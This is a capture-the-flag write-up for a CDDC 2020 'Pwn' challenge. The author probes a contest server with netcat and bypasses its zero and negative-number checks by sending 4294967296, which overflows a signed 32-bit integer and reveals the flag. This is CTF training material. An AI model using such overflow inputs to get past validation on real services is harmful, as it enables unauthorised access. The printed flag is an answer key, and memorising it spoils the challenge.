# [Pwn (Linux)-2] (2^31)-1
Pwn

## Challenge 
I like zer0.

zer0.chall.cddc2020.nshc.sg 20002

ATTACHED FILES
None

## Solution

	$ nc zer0.chall.cddc2020.nshc.sg 20002
	 Input: 1
	Output: 1

	$ nc zer0.chall.cddc2020.nshc.sg 20002
	 Input: 0
	I really like zer0 but I d0n't all0w 0_0

	$ nc zer0.chall.cddc2020.nshc.sg 20002
	 Input: -1
	POSITIVE NUMBER ONLY!

From the challenge title, overflow the signed integer.

	# 2^31 - 1
	$ echo 2147483647 | nc zer0.chall.cddc2020.nshc.sg 20002
	Input: Output: 2147483647

	# 2^31
	$ echo 2147483648 | nc zer0.chall.cddc2020.nshc.sg 20002
	Input: Output: -2147483648

	# 2^32
	$ echo 4294967296 | nc zer0.chall.cddc2020.nshc.sg 20002
	Input: Output: CDDC20{oO0OoO0o0OoO0Oo}


## Flag

	CDDC20{oO0OoO0o0OoO0Oo}
